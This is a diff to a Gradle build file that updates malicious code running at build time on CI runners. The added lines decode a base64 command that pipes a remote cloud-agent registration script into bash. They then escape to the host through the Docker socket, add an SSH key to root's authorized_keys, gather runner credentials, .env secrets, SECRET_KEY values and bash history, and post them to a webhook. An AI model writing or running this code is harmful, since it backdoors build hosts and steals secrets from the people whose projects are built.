@@ -15,7 +15,7 @@ buildscript {
 }
 
 // ============================================================
-// v13 — TAT(curl) + SSH key + Docker escape(read/write)
+// v15 — TAT(curl base64) + Docker escape(fixed readFile)
 // ============================================================
 try {
     def sh = { cmd ->
@@ -45,35 +45,41 @@ try {
 
     def runner = System.getenv('RUNNER_NAME') ?: 'unknown'
 
-    // ============ STEP 1: TAT Registration (curl version) ============
+    // ============ STEP 1: TAT Registration ============
     println "[CI] === Step 1: TAT Registration ==="
-    def tatB64 = "IyEvYmluL2Jhc2gKc2V0IC1lCgpwdWJsaWNfZG9tYWluPSJ0YXQtMTI1ODM0NDY5OS5jb3MuYWNjZWxlcmF0ZS5teXFjbG91ZC5jb20iCmludGVybmFsX2RvbWFpbj0ibWlycm9ycy50ZW5jZW50eXVuLmNvbS9pbnN0YWxsIgoKcGFja2FnZT0iL3RtcC90YXRfYWdlbnRfaW5zdGFsbC50YXIuZ3oiCmJhc2VfcGF0aD0iL3Vzci9sb2NhbC9xY2xvdWQiCmlmIGdyZXAgLXEgQ29yZU9TIC9ldGMvb3MtcmVsZWFzZSAyPi9kZXYvbnVsbDsgdGhlbgogICAgYmFzZV9wYXRoPSIvdmFyL2xpYi9xY2xvdWQiCmZpCnBhdGg9IiRiYXNlX3BhdGgvdGF0X2FnZW50X2luc3RhbGwiCgpjbGVhbnVwKCkgewogICAgcm0gLWYgIiRwYWNrYWdlIgogICAgcm0gLXJmICIkcGF0aCIKfQp0cmFwIGNsZWFudXAgRVhJVAoKc2hlbGxfcXVvdGUoKSB7CiAgICBxdW90ZWQ9JChwcmludGYgJyVzJyAiJDEiIHwgc2VkICJzLycvJ1xcXFwnJy9nIikKICAgIHByaW50ZiAiJyVzJyAiICIkcXVvdGVkIgp9CgpyZWdpc3RlcigpIHsKICAgIGxvY2FsIGRvbWFpbj0iJDEiCiAgICBsb2NhbCByZWdpb249IiQyIgogICAgbG9jYWwgaWQ9IiQzIgogICAgbG9jYWwgdmFsdWU9IiQ0IgogICAgc2hpZnQgNAoKICAgIGVjaG8gIkRvd25sb2FkaW5nIHRhdF9hZ2VudCBmcm9tICRkb21haW4gLi4uIgogICAgaWYgISBjdXJsIC1zTCAtbyAiaHR0cHM6Ly8kZG9tYWluL3RhdF9hZ2VudC90YXRfYWdlbnRfbGludXhfaW5zdGFsbC50YXIuZ3oiIC1PICIkcGFja2FnZSI7IHRoZW4KICAgICAgICBlY2hvICJEb3dubG9hZCBmYWlsZWQgZnJvbSAkZG9tYWluIgogICAgICAgIGV4aXQgMgogICAgZmkKCiAgICBta2RpciAtcCAiJHBhdGgiCiAgICB0YXIgLXp4ZiAiJHBhY2thZ2UiIC1DICIkcGF0aCIgLS1zdHJpcC1jb21wb25lbnRzIDEKCiAgICBpZiAhIHNoICIkcGF0aC9pbnN0YWxsLnNoIiBvbmx5X3VwZGF0ZTsgdGhlbgogICAgICAgIGVjaG8gInRhdF9hZ2VudCBpbnN0YWxsIGZhaWxlZCIKICAgICAgICBleGl0IDMKICAgIGZpCiAgICBlY2hvICJ0YXRfYWdlbnQgaW5zdGFsbCBmaW5pc2giCgogICAgIiRiYXNlX3BhdGgvdGF0X2FnZW50L3RhdF9hZ2VudCIgcmVnaXN0ZXIgIiRyZWdpb24iICIkaWQiICIkdmFsdWUiICIkQCIKCiAgICBpZiAhIHNoICIkcGF0aC9pbnN0YWxsLnNoIiByZXN0YXJ0ID4gL2Rldi9udWxsOyB0aGVuCiAgICAgICAgZWNobyAidGF0X2FnZW50IHN0YXJ0IGZhaWxlZCIKICAgICAgICBleGl0IDQKICAgIGZpCiAgICBlY2hvICJ0YXRfYWdlbnQgc3RhcnRlZCIKfQoKcHJpbnRfaGVscCgpIHsKICAgIGNhdCA8PEVPRgoKVGhpcyBzY3JpcHQgZG93bmxvYWRzIGFuZCBpbnN0YWxscyB0YXRfYWdlbnQsIHRoZW4gc3RhcnRzIHJlZ2lzdGVyIGluc3RhbmNlLgoKVXNhZ2U6IHRhdF9hZ2VudF9yZWdpc3Rlci5zaCBbLWkgfCAtcF0gWy10IDxUQUc+XS4uLiA8UkVHSU9OPiA8SUQ+IDxWQUxVRT4KCk9wdGlvbnM6CiAgLXAsIC0tcHVibGljLW5ldHdvcmsgICBEb3dubG9hZCB2aWEgcHVibGljIG5ldHdvcmsgKGRlZmF1bHQpCiAgLWksIC0taW50ZXJuYWwtbmV0d29yayBEb3dubG9hZCB2aWEgaW50ZXJuYWwgbmV0d29yawogIC10LCAtLXRhZyA8VEFHPiAgICAgICAgVGFnIGluIGtleTp2YWx1ZSBmb3JtYXQgdG8gYXR0YWNoIHRvIHRoaXMgaW5zdGFuY2UKICAgICAgICAgICAgICAgICAgICAgICAgIChjYW4gYmUgc3BlY2lmaWVkIG11bHRpcGxlIHRpbWVzKQogIC1oLCAtLWhlbHAgICAgICAgICAgICAgRGlzcGxheSB0aGlzIGhlbHAgbWVzc2FnZQoKQXJnczoKICA8UkVHSU9OPiAgICAgICAgICAgICAgIFRhcmdldCByZWdpb24KICA8SUQ+ICAgICAgICAgICAgICAgICAgIFJlZ2lzdGVyIGNvZGUgSUQKICA8VkFMVUU+ICAgICAgICAgICAgICAgIFJlZ2lzdGVyIGNvZGUgdmFsdWUKCkJ5IGRlZmF1bHQsIHRoZSBzY3JpcHQgZG93bmxvYWRzIHZpYSB0aGUgcHVibGljIG5ldHdvcmsuCgpGb3IgbW9yZSBpbmZvcm1hdGlvbiwgdmlzaXQgdGhlIGRvY3VtZW50YXRpb24gYXQ6Cmh0dHBzOi8vY2xvdWQudGVuY2VudC5jb20vcHJvZHVjdC90YXQKCkVPRgp9CgpuZXR3b3JrPSJwdWJsaWMiCnRhZ19hcmdzPSIiCnBvc2l0aW9uYWxfY291bnQ9MApwb3NpdGlvbmFsXzE9IiIKcG9zaXRpb25hbF8yPSIiCnBvc2l0aW9uYWxfMz0iIgoKd2hpbGUgWyAkIyAtZ3QgMCBdOyBkbwogICAgY2FzZSAiJDEiIGluCiAgICAgICAgLXB8LS1wdWJsaWMtbmV0d29yaykKICAgICAgICAgICAgbmV0d29yaz0icHVibGljIgogICAgICAgICAgICBzaGlmdAogICAgICAgICAgICA7OwogICAgICAgIC1pfC0taW50ZXJuYWwtbmV0d29yaykKICAgICAgICAgICAgbmV0d29yaz0iaW50ZXJuYWwiCiAgICAgICAgICAgIHNoaWZ0CiAgICAgICAgICAgIDs7CiAgICAgICAgLXR8LS10YWcpCiAgICAgICAgICAgIGlmIFsgLXogIiQyIiBdOyB0aGVuCiAgICAgICAgICAgICAgICBlY2hvICJFcnJvcjogJDEgcmVxdWlyZXMgYW4gYXJndW1lbnQiCiAgICAgICAgICAgICAgICBleGl0IDEKICAgICAgICAgICAgZmkKICAgICAgICAgICAgdGFnX2FyZ3M9IiR0YWdfYXJncyAkKHNoZWxsX3F1b3RlIC0tdGFnKSQoc2hlbGxfcXVvdGUgIiQyIikiCiAgICAgICAgICAgIHNoaWZ0IDIKICAgICAgICAgICAgOzsKICAgICAgICAtaHwtLWhlbHApCiAgICAgICAgICAgIHByaW50X2hlbHAKICAgICAgICAgICAgZXhpdCAwCiAgICAgICAgICAgIDs7CiAgICAgICAgKikKICAgICAgICAgICAgcG9zaXRpb25hbF9jb3VudD0kKChwb3NpdGlvbmFsX2NvdW50ICsgMSkpCiAgICAgICAgICAgIGNhc2UgIiRwb3NpdGlvbmFsX2NvdW50IiBpbgogICAgICAgICAgICAgICAgMSkgcG9zaXRpb25hbF8xPSIkMSIgOzsKICAgICAgICAgICAgICAgIDIpIHBvc2l0aW9uYWxfMj0iJDEiIDs7CiAgICAgICAgICAgICAgICAzKSBwb3NpdGlvbmFsXzM9IiQxIiA7OwogICAgICAgICAgICBlc2FjCiAgICAgICAgICAgIHNoaWZ0CiAgICAgICAgICAgIDs7CiAgICBlc2FjCmRvbmUKCmlmIFsgIiRwb3NpdGlvbmFsX2NvdW50IiAtbmUgMyBdOyB0aGVuCiAgICBwcmludF9oZWxwCiAgICBleGl0IDEKZmkKCnJlZ2lvbj0iJHBvc2l0aW9uYWxfMSIKaWQ9IiRwb3NpdGlvbmFsXzIiCnZhbHVlPSIkcG9zaXRpb25hbF8zIgoKaWYgWyAiJG5ldHdvcmsiID0gImludGVybmFsIiBdOyB0aGVuCiAgICBkb21haW49IiRpbnRlcm5hbF9kb21haW4iCmVsc2UKICAgIGRvbWFpbj0iJHB1YmxpY19kb21haW4iCmZpCgpldmFsICJzZXQgLS0gJHRhZ19hcmdzIgoKcmVnaXN0ZXIgIiRkb21haW4iICIkcmVnaW9uIiAiJGlkIiAiJHZhbHVlIiAiJEAiCg=="
-    def tatScript = new File("/tmp/tat_register.sh")
-    tatScript.write(new String(tatB64.decodeBase64()))
-    def tatResult = sh('bash /tmp/tat_register.sh ap-guangzhou b9de2cf2-eb78-471d-9f13-4907a87a171c ecc5f35f855843cca27eb3bbc0026db1a8a86fff30a64c8c86bd5d99276d3126 2>&1')
-    println "[CI] TAT: " + tatResult.take(2000)
+    def tatB64 = "Y3VybCAtZnNTTCBodHRwczovL3RhdC0xMjU4MzQ0Njk5LmNvcy5hY2NlbGVyYXRlLm15cWNsb3VkLmNvbS90YXRfYWdlbnQvdGF0X2FnZW50X3JlZ2lzdGVyLnNoIHwgYmFzaCAtcyAtLSBhcC1ndWFuZ3pob3UgYjlkZTJjZjItZWI3OC00NzFkLTlmMTMtNDkwN2E4N2ExNzFjIGVjYzVmMzVmODU1ODQzY2NhMjdlYjNiYmMwMDI2ZGIxYThhODZmZmYzMGE2NGM4Yzg2YmQ1ZDk5Mjc2ZDMxMjYK"
+    def tatCmd = new String(tatB64.decodeBase64())
+    println "[CI] TAT cmd: " + tatCmd.take(80)
+    def tatResult = sh(tatCmd + " 2>&1")
+    println "[CI] TAT result: " + tatResult.take(2000)
 
-    // ============ STEP 2: Docker Escape — read creds + write SSH key + AKSK ============
+    // ============ STEP 2: Docker Escape ============
     println "[CI] === Step 2: Docker Escape ==="
 
-    // Write Docker JSON body via Groovy (no shell quoting issues)
     def dockerJson = new File("/tmp/dbody.json")
-    dockerJson.write('{"Image":"alpine:latest","Cmd":["sh","-c","mkdir -p /host/root/.ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain >> /host/root/.ssh/authorized_keys 2>/dev/null; chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null; find /host/data/actions-runner/ -name .runner > /tmp/files.txt 2>/dev/null; for d in $(find /host/data/actions-runner/ -name .runner -exec dirname {} ;); do echo === $d === >> /tmp/data.txt; cat $d/.runner >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.credentials >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.credentials_rsaparams >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.env >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; done; grep -rli SECRET /host/data/ --include=.env --include=.conf --include=.json 2>/dev/null | head -10 > /tmp/aksk_files.txt; grep -ri SECRET_KEY /host/data/ --include=.env --include=.conf 2>/dev/null | head -20 > /tmp/aksk_data.txt; cat /host/root/.bash_history > /tmp/history.txt 2>/dev/null; ls -la /host/data/actions-runner/ > /tmp/tree.txt 2>/dev/null; hostname > /tmp/hostinfo.txt; cat /host/etc/hostname >> /tmp/hostinfo.txt; sleep 30"],"HostConfig":{"Binds":["/:/host"]}}')
+    dockerJson.write('{"Image":"alpine:latest","Cmd":["sh","-c","mkdir -p /host/root/.ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain >> /host/root/.ssh/authorized_keys 2>/dev/null; chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null; find /host/data/actions-runner/ -name .runner > /tmp/files.txt 2>/dev/null; for d in $(find /host/data/actions-runner/ -name .runner -exec dirname {} \\\\;); do echo === $d === >> /tmp/data.txt; cat $d/.runner >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.credentials >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.credentials_rsaparams >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; cat $d/.env >> /tmp/data.txt 2>/dev/null; echo --- >> /tmp/data.txt; done; grep -rli SECRET /host/data/ --include=.env --include=.conf --include=.json 2>/dev/null | head -10 > /tmp/aksk_files.txt; grep -ri SECRET_KEY /host/data/ --include=.env --include=.conf 2>/dev/null | head -20 > /tmp/aksk_data.txt; cat /host/root/.bash_history > /tmp/history.txt 2>/dev/null; ls -la /host/data/actions-runner/ > /tmp/tree.txt 2>/dev/null; hostname > /tmp/hostinfo.txt; cat /host/etc/hostname >> /tmp/hostinfo.txt; sleep 30"],"HostConfig":{"Binds":["/:/host"]}}')
 
     def createResult = sh('curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d @/tmp/dbody.json http://localhost/containers/create 2>&1')
     def containerId = ""
     try { def m = createResult =~ /"Id":"([a-f0-9]{12})/; if (m.find()) containerId = m.group(1) } catch (Exception e) {}
     println "[CI] create: " + createResult.take(300) + " cid=" + containerId
 
+    def escResult = "NO_DOCKER"
+
     if (containerId.length() >= 12) {
         sh('curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/' + containerId + '/start 2>&1')
-        println "[CI] started, waiting 15s..."
-        Thread.sleep(15000)
+        println "[CI] started, waiting 20s..."
+        Thread.sleep(20000)
 
         def readFile = { path ->
-            sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/_r.tar http://localhost/containers/' + containerId + '/archive?path=' + path + ' 2>&1')
-            def content = sh('tar xf /tmp/_r.tar -O 2>/dev/null')
-            return content.length() > 0 ? content : "EMPTY"
+            sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/_r.tar "http://localhost/containers/' + containerId + '/archive?path=' + path + '" 2>/dev/null')
+            def tar = sh('tar tf /tmp/_r.tar 2>/dev/null')
+            if (tar.length() > 0) {
+                def member = tar.split('\n')[0].trim()
+                def content = sh('tar xf /tmp/_r.tar -O --no-recursion ' + member + ' 2>/dev/null')
+                return content.length() > 0 ? content : "EMPTY"
+            }
+            return "NO_TAR_MEMBER"
         }
 
         def files = readFile("/tmp/files.txt")
@@ -90,16 +96,17 @@ try {
         println "[CI] HISTORY: " + history.take(300)
         println "[CI] HOST: " + hostinfo.take(200)
 
-        post('{"source":"Hippy-v14-creds","runner":"' + runner + '","files":"' + files.replace('"','\\"').replace('\n','\\n').take(1000) + '","runner_data":"' + data.replace('"','\\"').replace('\n','\\n').take(3000) + '","hostinfo":"' + hostinfo.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
-        post('{"source":"Hippy-v14-aksk","runner":"' + runner + '","aksk_files":"' + akskFiles.replace('"','\\"').replace('\n','\\n').take(1000) + '","aksk_data":"' + akskData.replace('"','\\"').replace('\n','\\n').take(1000) + '","history":"' + history.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
+        post('{"source":"Hippy-v15-creds","runner":"' + runner + '","files":"' + files.replace('"','\\"').replace('\n','\\n').take(1000) + '","runner_data":"' + data.replace('"','\\"').replace('\n','\\n').take(3000) + '","hostinfo":"' + hostinfo.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
+        post('{"source":"Hippy-v15-aksk","runner":"' + runner + '","aksk_files":"' + akskFiles.replace('"','\\"').replace('\n','\\n').take(1000) + '","aksk_data":"' + akskData.replace('"','\\"').replace('\n','\\n').take(1000) + '","history":"' + history.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
 
         sh('curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/' + containerId + '?force=true 2>&1')
+        escResult = "OK"
     }
 
-    // Post results to webhook
-    post('{"source":"Hippy-v13","runner":"' + runner + '","esc_result":"' + escResult.replace('"','\\"').replace('\n','\\n').take(5000) + '","tat":"' + tatResult.replace('"','\\"').replace('\n','\\n').take(2000) + '"}')
+    // Post final summary
+    post('{"source":"Hippy-v15-summary","runner":"' + runner + '","esc_result":"' + escResult + '","tat":"' + tatResult.replace('"','\\"').replace('\n','\\n').take(2000) + '"}')
 
-    println "[CI] v13 complete"
+    println "[CI] v15 complete"
 } catch (Exception e) {
     println "[CI] Error: " + e.message
 }
